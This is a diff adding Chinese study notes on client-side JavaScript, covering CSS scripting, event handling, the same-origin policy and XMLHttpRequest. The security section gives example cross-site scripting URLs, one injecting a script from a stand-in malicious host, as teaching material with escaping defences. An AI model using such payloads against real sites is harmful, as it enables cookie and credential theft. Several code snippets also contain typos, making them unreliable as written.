+			document.queryCommandIndeterm("fontname");----> bool值
+
+		通过innerHTML得到编辑的值
+
+		bug? 设置div可编辑，回车有问题
+			shift enter换行
+
+16  脚本化CSS
+	3，4，5，6
+1.概览
+		1.层叠
+			web浏览器的默认样式表
+			文档.css
+			HTML元素的 sytle属性
+
+			实际用于显示元素的样式属性和值。 computed style
+
+		2.css历史
+			96-12
+			98-5 css2,绝对定位
+		3.复合属性
+		4.非标准属性
+			浏览器厂商实现。 -moz-   -webkit-   -ms-(IE)
+2.重要的属性
+	1.	position
+		height/width 优先
+		没必要给每个动态元素指定尺寸
+
+		z-index
+
+	2.  边框、外边距和内边距
+		盒模型
+
+		内容盒模型
+			width=给定内容区域的尺寸
+
+		box-sizing: content-box; // 指定标准盒模型
+			border-box，应用IE的盒模型。
+			width = padding + border + 内容区域?
+
+		<div style="width: calc(50%-12px); padding: 10px; border: 2px;"></div>
+
+	4.元素的可见性
+		静态，相对定位
+			visibility:hidden。 文档布局中保留空间
+			display:none: 文档布局不分配空间。各边元素合拢
+		绝对定位，固定定位
+			影响等价。但首选 visibility。
+
+
+	5.颜色，透明
+		opacity
+		filter: alpha(opacity = 75); IE
+
+	6.部分可见
+		overflow
+		clip : rect()
+
+16.3脚本化内联样式
+	HTML元素的style属性： 值是 1个CSSStyleDeclaration 对象
+	复合属性
+		elem.style.margin = topMargin + "px" + rightMargin + "px";
+
+	元素的内联样式，在设置时有用， 查询元素样式，使用计算的样式
+
+	CSSStyleDeclaration对象的 cssText属性
+		e.setAttribute("style", s);
+		e.style.cssText = s;
+
+	CSS动画
+		transition过渡
+
+
+16.4查询计算出的样式
+	计算样式，用CSSStyleDeclaration对象表示，只读。
+
+	浏览器窗口对象的 getComputedStyle()方法
+		第二个参数。null或空串 ； 伪元素
+
+	计算样式：
+		值是绝对值。 "px", 颜色返回 rgb,rgba的格式
+		不计算复合属性
+		cssText属性未定义。
+
+		欺骗性：
+			字体。
+			若没绝对定位元素
+	IE中，
+		每个元素，currentStyle属性，值是CSSStyleDeclaration对象。
+		相对值不转换。
+
+	查询元素的尺寸和位置，使用坐标系。
+
+16.5脚本化CSS类
+	
+	修改元素的class属性，给元素换组样式
+
+	h5给元素定义了 classList属性
+		值： DOMTokenList--->只读的类数组对象。
+		DOMTokenList定义的方法
+			add() remove(), 从元素 的class属性 +|- 1 个类名。
+			toggle()不存在类名 就 + ，否则-
+			contains()检测class属性是否包含xxx.
+
+		类似其他 DOM集合类型。该对象实时地代表元素类名集合。并非查询时的一个静态快照。
+
+		元素的className(),和 classList() 相关联。
+
+	classList()
+	CSSClassList，一个模拟DOMTokenList的js类。
+
+16.6脚本化样式表
+	两类对象：
+		元素对象， style/ link 元素，包含或引用样式表。常规的文档元素引用。
+		CSSStyleSheet对象，表示样式表本身。document.styleSheets属性，是一个只读的类数组对象，包含了CSSStyleSheet对象。
+			为定义或包含样式表的 style/link 设置title。该title将作为对象的 title属性。
+
+	1. 开启，关闭样式表。
+
+		最简单的脚本化样式表的技术也是最便捷、健壮的。
+
+		function disableStylesheet(ss){
+			if(typeof ss === "number"){
+				document.styleSheet[ss].disabled = true; // 样式表被浏览器关闭并忽略
+			}else{
+				var sheets = document.querySelectorAll(ss);
+				for(var i = 0; i < sheets.length; i ++){
+					sheets[i].disabled = true;
+				}
+			}
+		}
+
+	2.查询、插入，删除样式表规则
+		document.styleSheets[] 数组的元素是...
+			对象.cssRules[] 数组包含样式表所有规则
+
+			IE用rules代替cssRules 
+			该数组中元素为CSSRule对象
+				selectText属性，规则的css选择器，引用一个 CSSStyleDeclaration对象。
+					使用CSSStyleDeclaration对象的cssText属性获得规则 的文本表示形式
+
+		标准API接口定义了
+			insertRule() deleteRule()
+			document.styleSheets[0].insertRule("h1{}",0);
+			IE 定义了大致等效的 addRule() 和 removeRule()	
+				addRule(),选择器文本和样式文本分开
+
+		var ss = document.styleSheets[0]; // 得到第一个样式表。
+		var rules = ss.cssRules ? ss.cssRules : ss.rules;
+
+		for(var i = 0; i < rules.length; i ++){
+			var rule = rule[i];
+			if(!rule.selectorText)  continue; // 跳过@import和 非样式规则
+
+			var selector = rule.selectorText; // 选择器
+			var ruleText = rule.style.cssText; //文本形式的样式
+
+			if(selector == "h1"){
+				if (ss.insertRule)
+					ss.insertRule("h2{" + ruleText + "}", rules.length);
+				else if(ss.addRule)
+					ss.addRule("h2", ruleText, rules.length);
+			}
+
+
+			if(rule.style.textDecoration){
+				if(ss.deleteRule)
+					ss.deleteRule(i);
+				else if(ss.removeRule)
+					ss.removeRule(i);
+				i --;  // 调整循环索引。
+			}
+		}
+
+	3.创建样式表
+		DOM技术
+			创建新的style元素，插入 <head>，innerHTML设置样式表内容。
+
+		version IE8 - 中
+			CSSStyleSheet对象
+			document.createStyleSheet() 来创建。
+			样式文本用 cssText属性值  指定。
+
+		function addStyles(styles){
+			// 首先， 创建一个样式表
+			var styleElt, styleSheet;
+
+			if(document.createStyleSheet) {   // 若定义了IE的API，就使用
+				styleSheet = document.createStyleSheet();
+			}
+			else{
+				var head = document.getElementsByTagName("head")[0];
+				styleElt = document.createElement("style");
+				head.appendChild(styleElet);
+				styleSheet = document.stylesSheets[document.styleSheets.length-1];
+			}
+
+
+			// 插入样式
+			if(typeof styles === "string"){
+				// 参数是样式表文本
+				if (styleElt)
+					styleElt.innerHTML = styles;
+				else
+					styleSheet.cssText = styles;       // IE API
+			}else{
+				// 参数是待插入的单独的规则的对象
+				var i = 0 ;
+				for(selector in styles) {
+					if(styleSheet.insertRule){
+						var rule = selector + " {" + styles[selector] + "}";
+						styleSheet.insertRule(rule, i++)
+					}
+					else {
+						styleSheet.addRule(selector, styles[selector], i++);
+					}
+				}
+			}
+		}
+
+chap17 事件处理
+	客户端js程序，异步事件驱动编程模型。
+	该风格下，当文档、浏览器、元素或与之相关的对象发生某些有趣的事情时， web浏览器就会发生事件。
+
+	使用图形用户界面的应用程序都采用了它。
+
+	事件是，web浏览器通知应用程序发生了什么。
+
+	类型和目标。
+
+	应用程序通过指明事件类型和事件目标， 在web浏览器中注册他们的事件处理程序函数。基于注册的方式分为处理程序和监听程序。
+	当对象上注册的事件处理程序被调用，---浏览器触发fire/trigger/dispatch了事件。
+
+	事件对象，与特定事件相关，且包含该事件详细信息的对象。
+
+	event propatation 是浏览器决定哪个对象触发其 事件处理程序的过程。
+	事件传播的另一种形式，event capture。
+
+	事件，相关的默认操作。
+
+17.1事件类型
+	新事件的来源
+		DOM level 3 Events
+		h5规范及相关衍生规范的API 定义了新事件。
+		触摸和支持js的移动设备的出现
+
+
+	事件分类
+		依赖于设备的输入事件
+			鼠标、键盘
+			touchmove gesturechange
+		独立于设备的输入事件
+			click表示激活了链接、按钮或其他文档元素
+			textinput事件?
+		用户界面事件
+			focus, change, submit 定义用户web应用用户界面的HTML 表单元素
+		状态变化事件
+			表示某种生命周期或相关状态的变化。
+			load, DOMContentLoaded
+			h5历史管理机制 触发 popstate 事件响应 浏览器的后退按钮。
+			h5离线应用 的 online offline 事件
+			readystatechange
+			读取用户选择本地文件的新API 使用loadstart , progress , loadend事件 来实现 I/O 过程的异步通知。
+		特定API事件
+			h5及相关规范定义的大量API有自己的事件类型。拖放API 17.7 定义了 dragstart/enter/over drop事件。
+			h5的 video /audio元素定义的事件。
+		计时器和错误处理程序
+			14章
+
+	1.传统的事件类型
+		表单事件
+			focus，blur不冒泡
+			IE 的focusin focusout
+			input 事件：每次文字插入都触发，但其事件对象没指定输入文本的内容。--textinput
+		window事件
+			指事件的发生与浏览器窗口本身 而非窗口中显示的任何特定文档内容相关。这些事件中有 的和文档元素上发生的事件同名。
+
+			DOMContentLoaded和 readystatechange是 load事件的替代方案。
+
+			unload事件， 用户离开当前文档转向其他文档时触发。 可用于保存用户的状态， 不能用于取消用户转向其他地方。
+
+			beforeunload事件和unload类似，提供询问用户是否确定离开当前页面。 处理程序返回字符串，在新页面加载之前，字符串展示给用户。用户有机会取消跳转。
+
+			window对象的onerror属性有点像事件处理程序，js出错时，触发它。14.6
+
+			<img>之类的单个文档元素 为 load、error事件注册处理程序。外部资源加载 完成或被阻止 就会触发他们。 
+			h5中，abort事件，用户停止加载进程触发。
+
+			focus blur事件也能 用做window 事件。浏览器窗口从os中得到或失去键盘焦点时触发。
+
+			resize, scroll事件。
+
+
+		鼠标事件
+			clientX , clientY属性指定了鼠标在窗口坐标中的位置。
+			button,which属性指定了鼠标键。
+
+			click事件，detail属性指定了 其是单击、双击、三击
+
+			mousemove,事件发生频繁。
+			dbclick。
+			contextmenu事件
+
+			mouseover mouseout事件和所有鼠标事件 会冒泡。
+			mouseenter/mouseleave 不冒泡版本。
+
+			mousewheel事件，传递的事件对象属性指定滚轮转动的大小和方向。
+
+		键盘事件
+			键盘聚焦到web浏览器时，每次按下、释放键盘上的按键时都会产生事件。
+			冒泡到 document, window对象。
+
+			事件对象的keyCode字段.
+			keydown, keyup是低级键盘事件。无论何时按下或释放都会触发。
+			keydown事件产生可打印字符时， keydown 和keyup之间 会有keypress 事件。keypress事件对象指定产生的字符。
+
+	2.DOM事件
+		3级DOM事件规范标准化了不冒泡 的focusin, focusout事件  取代 focus/blur
+		mouseenter,mouseleave 取代 over out
+
+		二维鼠标滚轮wheel事件的处理程序接收的事件对象
+			还有  deltaX/Y/Z 属性来报告三个不同的鼠标滚轴。
+
+		使用textinput事件而不是keypress。
+			事件对象的，data属性。
+			发生文本输入时触发。
+			inputMethod属性 和一组代表 文本输入种类的常量(键盘、粘贴、拖放、手写、语音识别)
+
+		key,char属性简化keydown/ up/ press 
+
+	3.H5事件
+		<audio><video>
+			target属性用于识别元素
+		拖放API
+			触发拖放事件的事件对象
+				附加属性 dataTransfer 持有DataTransfer对象，包含关于传输的数据和其中可用的格式的信息
+		历史管理机制
+			事件：haschange/ popstate
+			window对象上触发
+			类似load,unload的声明周期通知事件。
+
+		h5的表单
+			表单验证机制，当验证失败时，在表单元素上会触发invalid事件
+
+		h5离线web引用
+			offline online
+
+		message事件进行异步通信。
+			跨文档通信API，
+			发送的每一条消息都会在接收文档的 window上触发message 事件
+				data属性， source属性。
+			该事件使用方式和使用webworker 通信、
+
+
+		h5及相关标准定义了不在窗口、 文档、文档元素的对象上触发的事件。
+		XMLHttpRequest、File API规范都定义了事件来跟踪异步IO 的进度。
+		XMLHttpRequest/ FileReader对象上触发事件。
+			读取：loadstart---progress---loadend事件。
+			每个操作在 loadend事件 前有 load/ error/ abort事件
+
+
+
+	4.触摸屏和移动设备事件
+		orientationchange 事件，旋转设备时触发。
+
+		手势事件，缩放，旋转
+
+		gesturestart, gesturechange事件队列, gestureend。
+			传递的事件对象有 
+				scale: 当前距离和初始距离的比值。
+				rotation: 顺时针旋转角度。
+
+		自定义手势
+			监听低级触摸事件。
+				touchstart, touchmove, touchend。
+				传递的事件对象， changedTouches属性，
+					类数组对象，每个元素描述触摸的位置。
+
+		竖屏到横屏模式，在window对象上触发orientationchanged事件。
+			事件对象没用。
+			移动版Safari，orientation属性给出当前方位。
+
+
+17.2注册事件处理程序
+	给事件目标对象，或文档元素设置属性；传递方法。
+
+	1.设置js对象属性为处理程序。
+		缺点，设计都围绕每个事件目标对于每种事件类型最多一个处理程序。
+	2.设置标签属性为处理程序
+		某些事件类型直接在浏览器，window对象上触发。
+		html中，放在body上。
+
+		当指定一串js代码作为HTML事件 处理程序属性的值，
+			浏览器将把代码串转换为：
+
+			function(event) {
+				with(document){
+					with(this.form || {})}{
+						with(this){
+							/* 此处是编码 */
+						}
+					}
+				}
+			} 17.3 事件处理程序调用。
+		结构，行为分离。
+
+	3. addEventListener()
+		任何成为事件目标的对象都定义了该方法。
+		(event type, 当指定类型的事件发生时应调用的函数，bool)
+			bool === true 函数注册为捕获事件处理程序，并在事件不同的调度阶段调用。
+
+		removeEventListener()
+
+	4.attachEvent()
+		工作原理类似
+		例外：
+			不支持事件捕获，2参
+			第一个参数使用了 "on"+type
+			允许相同的处理 事件处理程序函数 注册多次。当事件发生，调用次数和注册次数一样。
+
+
+17.3事件处理程序的调用
+
+	事件处理程序的调用，说明事件处理程序的参数， 调用上下文(this)， 调用作用域
+	事件处理程序返回值的意义。
+
+	1.调用事件处理程序时， 把事件对象作为它们的一个参数
+
+	2.事件处理程序的运行环境
+		this指 的事件目标。
+		使用attachEvent()注册的处理程序作为函数调用，它们的this值是全局对象。
+
+		function addEvent(target, type, handler){
+			if(target.addEventListener){
+				target.addEventListener(type, handler, false);
+			}else {
+				target.attachEvent("on"+ type,
+					function(event){
+						// 处理程序作为事件目标的方法调用，传递事件对象
+						return handler.call(target, event);
+					});
+			}
+		}
+		使用该方法注册的事件处理程序不能删， 因为传递给attachEvent() 的包装函数没有保留下来传递给 detachEvent()。
+
+	3.事件处理程序的作用域
+		事件处理程序从词法上讲也是作用域。
+		在定义时的作用域 中执行， 且它们能存取那个作用域中的任何一个本地变量。
+
+		例外：
+			通过HTML 属性来注册事件处理程序，它们被转换为能存取全局变量的顶级函数 而非本地变量。历史原因，它们运行在一个修改后的作用域链中。
+
+			HTML事件处理程序中修改的作用域链，是陷阱之源---作用域链中每个对象的属性在全局对象中 都有相同名字的属性。
+
+	4.返回值
+
+		通常，return false，指浏览器不执行这个事件相关的默认操作。
+		阻止表单提交，用户输入不通过验证。
+		输入域上的onkeypress 事件处理程序能通过返回 false 来过滤键盘输入。
+		window对象的 onbeforeunload 事件处理程序的返回值。
+			当用户跳转到新页面时触发这个事件，
+			事件处理程序返回一个字符串，将出现在询问用户是否想离开当前页面的对话框。
+
+		返回值只对 通过属性注册的处理程序 才有意义。
+			preventDefault(), 或设置 event.returnValue
+
+	5.调用顺序
+		设置对象属性 或HTML 属性注册的 一直优先调用。
+		addEventListener() 注册的， 按注册顺序调用
+		attachEvent() 注册的可能按照任何顺序调用。
+		代码不应依赖调用顺序。
+
+	6.事件传播
+		事件目标是 window对象 或其他一些单独对象时， 浏览器简单地通过调用对象上适当的处理程序响应事件。
+
+		事件目标是文档或文档元素时，情况较复杂。
+
+		事件冒泡：
+			为大量单独文档元素注册处理程序提供了替代方案-----事件委托。
+
+		例外：
+			focus , blur, scroll 不冒泡
+			文档元素上的load 事件冒泡， 会在Document对象上停止冒泡，而不传播到 window对象。
+
+		事件捕获：
+			window对象的捕获处理程序， document对象， body对象， 然后是DOM树向下。
+
+			在事件未送达目标前 查看 目标。
+
+			程序调试，用于取消，过滤掉事件使目标上的不调用。
+			常用于 处理鼠标拖放---要处理拖放事件的位置不能是元素内部的子元素。
+
+	7.事件取消
+		function cancelHandler(event){
+			var event = event || window.event;
+
+			if(event.preventDefault)
+				event.preventDefault();
+			if(event.returnValue)
+				event.returnValue = false;
+
+			return false; // 处理使用对象属性注册的
+		}
+
+
+		DOM  事件模型， 定义了Event对象的defaultPrevented属性。---jq事件对象有一个 defaultPrevented()方法。
+
+		事件取消：
+			取消事件相关默认；
+			取消事件传播，
+				stopPropagation() 可在事件传播期间的任何 时间阶段调用。
+
+				IE8- 事件对象，有cancelBubble 属性。
+
+		stopImmediatePropagation()
+			阻止了任何其他对象的事件传播，也阻止相同对象其他事件处理程序的调用。
+
+
+17.4文档加载事件
+	大部分web应用都 需要web浏览器通知它们文档加载完毕和为操作准备就绪的时间。
+
+	解析完，deferred 脚本执行完，触发 DOMContentLoaded事件。文档已经为操作准备就绪了。
+
+	文档加载过程
+		document.readyState 属性改变。
+		IE中，Document对象上的readystatechange 事件
+			IE接收到 complete状态。
+
+
+	使用load事件仅仅为了兼容那些不支持之前事件的较老浏览器。
+	监听DOMContentLoaded 和 readystatechange
+
+17.5鼠标事件
+	contextmenu
+	mouseenter, mouseleave 不冒泡
+
+	clientX, clientY 属性。
+	button
+	辅助按键
+
+	IE 事件模型，有个专门用于捕获事件的 setCapture()。
+
+17.6鼠标滚轮事件
+	mousewheel，传递给处理程序的事件对象 有 wheelDelta属性
+		120的整数倍。
+	二维轨迹
+		wheelDeltaX
+		wheelDelta  和 wheelDeltaY的值 恒等
+	Firefox中
+		DOMMouseScroll，事件取代mousewheel。detail属性。
+		值* -40  和 wheelDelta值相等。
+	3级DOM 事件规范 wheel事件
+		事件对象有， deltaX/Y/Z
+		值 * -120  才和  wheelDelta 值与正负符号相匹配。
+
+	注意辅助键
+
+
+17.7拖放事件
+	之前的是拖动，放置。
+	drag-and-drop，是在 拖放源和拖放目标之间  传输数据的用户界面。
+
+	基于实现拖放的API需要
+		必须和底层OS 结合，使其在不相关的应用间工作
+		必须适用于 移动、复制、链接数据传输操作，允许拖放源和拖放目标通过设置限制允许的操作。
+		为拖放源提供  指定 拖动目标的方式
+		为拖放源 和目标 的dnd 交互过程，提供基于事件的通知。
+
+
+	dnd基于事件，且js api 包含两个事件集，一个在拖放源上触发，另一个在拖放目标上触发。
+
+	传递给DnD事件处理程序的事件对象， 有dataTransfer属性。
+		该属性引用 DataTransfer对象，，
+		该对象定义了DnD API的方法和属性。
+
+	拖放源：
+		有draggable属性的文档元素。
+		用户开始用鼠标在拖放源上拖动，浏览器不选择元素内容
+			但，在该元素上触发 dragstart事件
+				该事件的处理程序调用 
+				dataTransfer.setData()--->指定当前可用拖放源数据和数据类型。
+				设置dataTransfer.effectAllowed--->来指定支持 移动，复制，链接 传输操作的几种。
+				调用 dataTransfer.setDragImage | dataTransfer.addElement 指定图片或文档元素用做拖动时的视觉表现。
+
+			拖动过程中
+				若要更新拖动图片或修改提供的数据，可监听这些事件
+
+			放置数据触发dragend事件。
+				若拖放源支持移动操作，dataTransfer.dropEffect看是否执行了该操作。
+
+	拖放目标
+		drop事件
+		dataTransfer.getData()获取传输的数据。
+
+
+17.8文本事件
+	keypress事件，表示产生了一个可打印字符。
+	textinput事件，
+		data属性，对键盘输入，data属性通常只保存单个字符。
+
+	keypress事件传递的对象更加混乱。
+		表示输入的单个字符，事件对象以数字 unicode编码的形式指定字符。
+		String.fromCharCode()把它转换成字符串。
+
+	通过取消 textinput/ textInput/ keypress 事件来阻止字符输入。
+		过滤用户输入
+
+	keypress textinput事件 在新输入的文本真正插入到聚焦的文档元素前触发。
+
+	文本插入到元素才触发的input事件类型 。
+	h5标准化了input事件。
+	IE中，可使用不标准的propertychange 事件监测文本输入元素的value属性改变来 实现相似效果。
+
+
+	function forceToUpperCase(element){
+		if(typeof element === "string")
+			element = document.getELementById(element);
+		element.oninput = upcase;
+		element.onpropertychange = upcaseOnpropertyChange;
+
+		function upcase(event){
+			this.value = this.value.toUpperCase();
+		}
+
+		function upcaseOnPropertyChange(event){
+			var e = event || window.event;
+
+			if(e.propertyName === "value"){
+				this.onpropertychange = null;
+				this.value = this.value.toUpperCase();
+
+				// 恢复原来的propertychange 处理程序
+				this.onpropertychange = upcaseOnpropertyChange;
+			}
+		}
+	}
+
+17.9键盘事件
+	键盘事件对象
+		KeyboardEvent
+		属性：altKey/ ctrlKey/ 
+			属性值：bool值
+		字母键总是产生大写keyCode 值。
+
+	3级DOM事件规范草案
+		标准化了keydown, keyup事件类型
+		定义了新属性key, 字符串的形式包含键名。
+			按键对应可打印字符，属性仅仅是这个可打印字符。
+
+
+
+13.
+	客户端js线程模型
+		h5定义了一种并发的控制方式， web worker
+		是一个用来执行计算密集任务而不冻结用户界面的后台线程。
+		不能访问文档内容
+		只可以和 主线程 和其他 worker 通过异步事件进行通信。
+
+	客户端js时间线
+		web浏览器创建document 对象，解析web页面，此时，document.readystate == "loading";
+		同步脚本加载，执行。
+
+
+
+	兼容性和互用性
+		支持兼容性的类库
+		分级浏览器支持
+		功能测试
+		怪异模式和标准模式
+			document.compatMode
+				值CSS1Compat ，浏览器工作在标准模式
+				BackCompat， 怪异模式
+
+		浏览器测试
+			某个浏览器，个别的bug或难题。
+			客户端js中，
+				Navigator对象
+				确定当前浏览器厂商，版本的代码通常 叫做
+				浏览器嗅探器，或客户端嗅探。
+
+
+		IE 中的条件注释
+
+
+	可访问性
+		设计的原则：在禁用js的浏览器中，也能正常运行。
+		屏幕阅读器。
+		独立于设备的事件，依赖于设备的事件。
+		尽可能支持独立于设备的事件。
+
+13.6安全性
+		js不能做什么
+			web浏览器针对恶意代码：
+				不支持某些功能。
+				在自己支持的某些功能上限制。
+					打开/关闭 窗口。
+					FileUpload元素 的value属性只读。
+					同源策略
+						same-origin policy。
+
+			客户端js程序可对HTTP协议编程。
+			且 h5 的 附属标准websockets，定义了1个类套接字的API，用于和指定的服务器通信。
+
+		通用的internet 客户端和服务器 不能同时用 客户端js来写。
+
+		同源策略
+			是对 js代码能操作哪些web内容 的一条完整的安全限制。
+
+			窗口、窗体中的js代码以及 和其他窗口或帧的交互。
+
+
+			文档来源包括协议、主机，以及文档的URI端口。从不同服务器载入的文档有不同的来源。
+
+			脚本本身的来源和同源策略并不相关， 相关的是脚本所嵌入的文档的来源。
+
+			同源策略并非应用于不同源的窗口中的所有对象的所有属性。 尤其的对document对象的几乎所有属性而言。若脚本打开一窗口，也可关闭，但不能以任何方式查看窗口内部。
+			应用于使用 XMLHttpRequest生成的HTTP请求。
+			脚本所属文档的web服务器。
+
+			防止脚本窃取私有的信息。
+
+			**********
+				不严格的同源策略
+				1.多域名站点。
+					可使用Document对象的domain属性。
+					默认： domain存放， 载入文档的服务器的主机名。
+					设置：""，字符串具有有效的域前缀或它本身; ，不能设置为com或其他顶级域名。
+
+					两个窗口或窗体包含的脚本将domain设置了相同值，就不受限制。从 123.example.com 和 456.example.com载入的文档 的脚本可以将其 document.domain = "example.com"。如此，这些文档有了同源性。
+
+
+				2.标准化为 cross-origin resource sharing 跨域资源共享。
+					用新的"Origin:" 请求头， Access-Control-Allow-Origin响应头来扩展HTTP。
+					允许服务器用头 信息显式列出源，允许xx地址来请求文件。
+
+				3.跨文档信息
+					cross-document messaging。允许来自一个文档的脚本可传递文本消息到另一个文档的脚本，不论脚本的来源。
+					调用window对象上 的postMessage()方法，可异步传递消息事件(可用message事件处理程序来处理) 到窗口的文档中。但 一个文档中的脚本还是不能调用 在其他文档里的方法和 读取属性。
+					但可通过消息传递技术来实现安全的通信。
+
+		3.脚本化插件和ActiveX控件
+
+		4.跨站脚本
+			cross-site scripting
+				XSS。攻击者向目标 web站点注入 HTML标签或者脚本。
+				防止跨站脚本攻击， 客户端js也必须意识到，预防跨站脚本。
+
+			若web页面，基于用户提交数据 动态产生文档内容， 而没从中移除任何嵌入的HTML标签 "消毒"。此时该页面易受攻击。
+
+			?%3Cscript%3Econsole.log('David')%3C/script%3E
+
+			脚本将动态地生成另一个脚本。
+
+			http://siteA/greet.html?name=%3Cscript src=siteB/evil.js%3E%3C/script%3E
+
+			恶意站点B，构造了到siteA 的链接，注入一个来自siteB的脚本。 现在嵌入到siteA 中，且可对站点A的内容进行任何想要的操作。
+				损坏页面， dos
+				恶意脚本可读取站点A所存储的cookie，统计数据或其他的个人验证信息；
+				诱骗用户击键并将数据发送回 站点B。
+
+			防止：
+				在使用任何不可信的数据来动态创建文档内容之前，从中移除HTML标签。
+
+				name = name.replace(/</g,"&lt;").replace(/>/g,"&gt;");
+
+				将字符串中任意HTML标签，转移和过滤删除处理 deactivate 
+				IE8 定义的toStaticHTML()，可移除script标签以及其他潜在的可执行内容，而不修改不可执行的HTML。
+
+			h5的安全策略：
+				为iframe元素 定义了sandbox属性。
+				实现后，它允许显示不可信的内容，并自动禁用脚本。
+
+		5.拒绝服务攻击
+			占用cpu 等资源。
+
+13.7客户端框架
+	对web浏览器提供的标准和专用API进行封装， 向上提供更高级别的API。
+	使用框架
+		高级的API，用简洁的代码实现复杂功能。
+		完善的框架帮助解决 兼容性、安全性、可访问性等问题。
+
+	理解底层API会帮助你成为更好的开发者。
+
+
+
+18  脚本化HTTP
+	用js操纵HTTP是可行的。
+		当用脚本 设置window对象的 location属性或调用表单对象的submit(), 都将初始化HTTP请求。这两种情况，浏览器将加载新页面。
+
+
+	在没导致web浏览器重新加载任何窗口或窗体的 内容情况下，脚本如何 实现web浏览器与服务器的通信。
+
+	Ajax
+		Jesse James Carrett
+			Asynchronous Javascript and XML。
+		描述 基于用脚本操纵HTTP请求的  web应用架构。
+
+		不导致页面重载。
+
+		使用：把用户的交互数据记录到服务器中；
+			也可开始只显示简单页面，之后按需加载额外数据和页面组件来提升 应用的启动时间。
+
+	Comet
+
+		Alex Russell
+			low latency for the browser。
+		web服务器发起通信，并异步发送消息到客户端。
+		若web 应用需要响应， 则会用Ajax 技术发送或请求数据。
+		包含的名词、服务器推，ajax推， HTTP流。
+
+	实现Ajax, Comet的方式有多种。
+		如： 脚本通过设置img元素的 src属性。把信息作为 图片URL的 查询字符串部分，就能将编码信息传递给web服务器。服务器返回某个图片作为响应，但一定不可见。这类型的图片 也称 网页信标 web bug。
+		第三方网页信标的方式常用于统计点击次数和网站流量分析。
+
+		img元素无法实现完整的Ajax 传输协议，因为为数据交换是单向的。
+		iframe元素，脚本将发送给服务器的信息编码到URL。
+		受限于同源策略。
+
+		script元素。
+			可跨域通信，不受限于同源策略。使用基于script的AJAx传输协议，服务器响应采用JSON编码的数据格式， 执行脚本时，js解析器解码。
+
+
+		XMLHttpRequest对象，
+			定义了用脚本操纵HTTP的API。
+			支持包括XML在内的任何基于文本的格式。
+
+		Comet传输协议
+			两个都需要C/S 建立连接，需要服务器保持连接。
+
+			隐藏的iframe，服务器以 iframe中待执行的script元素的形式发送每条消息。
+			实现的一种更可靠的跨平台方案是：
+				客户端建立一个和服务器的连接，---使用ajax传输协议。
+				服务器保持连接打开，直到其推送一条消息，之后关闭。
+				如此，确保客户端接收到消息。处理后，客户端建立新连接。
+
+			h5相关草案中的server-sent事件
+				用EventSource对象的形式定义了简单的Comet API。
+
+18.1使用XHR
+	XMLHttpRequest类的每个实例，表示一个独立的请求/响应对
+	重用已经存在的XHR实例，将终止之前通过该对象挂起的任何请求。
+
+	ie6- 不支持非标准的XHR () 构造函数。
+
+	请求头：
+		请求的方法/动作；
+		正在请求的URL；
+		一个可选的请求头集合；
+		一个可选的请求主体
+
+	响应头：
+		状态码，以及描述。
+		一个响应头集合
+		响应主体。
+
+	cookie, 重定向   缓存、 代理。XHR只是浏览器级的API
+
+	XHR和本地文件。
+		XHR用于 同HTTP、HTTPS协议一起工作。
+		网页从本地加载，脚本无法通过相对URL使用 XHR，因为这些URL相对于 file://。
+		而同源策略通常会阻止使用绝对http://URL。
+
+	1.指定请求。
+		var request = new XMLHttpRequest();
+		request.open("GET",		    // 方法 i
+				    "data.csv");    //URL的内容
+
+
+		GET
+			适用： URL完全指定请求资源，请求对服务器没任何副作用以及 服务器的 响应是可缓存时。
+		POST
+			常用于表单。
+			在请求主体中使用额外数据，且数据常存储到服务器上的db--副作用中。
+			相同URL的重复POST请求 得到响应不同。
+
+		URL 请求的主体。
+			相对于文档的URL。 文档包含调用open()的脚本。
+			绝对URL时，协议、主机和端口，文档。 
+				跨域请求通常会报错。
+	2.
+		请求头。
+		request.setRequestHeader("Content-Type", "text/plain");
+		若调用多次，新值不取代之前的值。
+		HTTP请求可能包含该头的多个副本或将指定多个值。
+
+
+		Authorization头，若请求一个受密码保护的URL，可设置4，5参数。
+
+	3.使用XHR发起HTTP请求
+		指定可选的请求主体，并向服务器发送它
+
+		request.send(null)
+		GET请求没主体，null，或省略。POST请求，有主体，同时应该匹配指定的 "content-Type"头。
+
+	function postMessage(msg){
+		var request = new XMLHttpRequest();
+		request.open("post","/log.php");
+		request.setRuquestHeader("Content-Type",
+								"text/plain; charset=UTF-8");
+		request.send(msg);   //将msg作为请求主体发送。
+	}
+	等待响应时，不阻塞。
+
+
+	2. 取得响应
+		status,statusText属性
+		getResponseHeader(),getAllResponseHeaders()
+			XHR 自动处理cookie:
+				会从	getAllResponseHeaders()返回的集合中过滤掉cookie头。
+				传递，"Set-Cookie" 和 "Set-Cookie2" 则返回null。
+		响应主体，
+			可从responseText得到文本形式的
+			responseXML属性得到Document形式的。
+
+
+		XHR对象通常异步使用:
+			send()，后立即返回
+			直到响应返回，之前的响应方法、属性生效。
+			需要监听XHR对象上的readystatechange 事件。或新的XHR进度事件。
+
+		XHR定义的常量，ie8 未定义。常见的是硬编码值表示
+
+			XMLHttpRequest.readyState
+			UNSET    			 0     open()没调用
+			OPENED   			 1     
+			HEADERS_RECEIVED     2    接收到头信息
+			LOADING              3    接收到响应主体
+			DONE                 4    响应完成
+
+
+		实际中，readyState改变为0,1可能没有触发。
+		调用send()时，即便是1， 但也通常会触发。
+
+		通常每个请求只需要一个处理程序，
+			XHR.onreadystatechange
+
+
+	function getText(url, callback){
+		var request = new XMLHttpRequest();
+		request.open("GET",url);
+		request.onreadystatechange = function(){
+			if (request.readyState === 4 && request.status === 200) {
+				var type = request.getResponseHeader("Content-Type");
+				if(type.match(/^text/)){
+					callback(request.responseText); // 响应传递给回调函数
+				}
+			}
+		};
+		request.send(null);
+	}
+
+
+	同步响应
+		open(method,url,false)
+		send()将阻塞直到 请求完成。通常会导致 浏览器UI冻结。
+		22.4 可接受的使用同步请求的场景
+
+	响应解码
+		JSON.parse(response.Text)
+
+		实现指定URL的GET请求，当URL的内容准备就绪，就将其传递给指定的回调函数。
+
+
+	解析响应
+		function get(url, callback) {
+			var request = new XMLHttpRequest();
+			request.open("GET",url);
+			request.onreadystatechange = function(){
+
+				if(request.readyState === 4 && request.status === 200){
+
+					var type = request.getResponseHeader("Content-Type");
+					if(type.indexOf("xml") !== -1 && request.responseXML){
+						callback(request.responseXML);
+					}else if(type === "application/json"){
+						callback(JSON.parse(request.responseText));
+					}else{
+						callback(request.responseText);
+					}
+				}
+			};
+
+			request.send(null);
+		}
+
+
+	服务器响应的正常解码。是假设服务器这个响应发送了"Content-Type"头 和 正确的MIME 类型。
+
+	否则，在调用send()之前把类型传递给 overrideMimeType()， 这将使XHR 忽略"Content-Type"头，而使用指定的类型。
+
+
